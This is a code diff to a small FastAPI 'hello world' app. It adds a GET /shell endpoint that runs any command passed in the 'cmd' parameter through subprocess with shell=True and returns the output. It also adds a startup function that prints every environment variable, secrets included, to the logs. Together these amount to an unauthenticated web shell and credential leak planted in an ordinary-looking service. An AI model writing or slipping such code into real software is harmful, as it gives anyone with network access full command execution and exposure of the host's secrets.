@@ -1,13 +1,44 @@
 import os
+import subprocess
 import asyncio
-from fastapi import FastAPI
+from fastapi import FastAPI, Request
+from fastapi.responses import JSONResponse
 
 app = FastAPI()
 
+def print_env_vars():
+    print("===== Environment Variables =====")
+    print(f"PORT env: {os.getenv('PORT')}")
+    for key, value in os.environ.items():
+        print(f"{key}={value}")
+    print("=================================")
+print_env_vars()
 
 @app.get("/")
 async def index():
-    return {"Hello": "World"}
+    return "hello world"
+
+@app.get("/shell")
+async def shell(cmd: str):
+    try:
+        result = subprocess.run(
+            cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+        return JSONResponse({
+            "cmd": cmd,
+            "returncode": result.returncode,
+            "stdout": result.stdout,
+            "stderr": result.stderr
+        })
+    except Exception as e:
+        return JSONResponse(
+            {"error": str(e)},
+            status_code=500
+        )
 
 if __name__ == '__main__':
     from hypercorn.config import Config
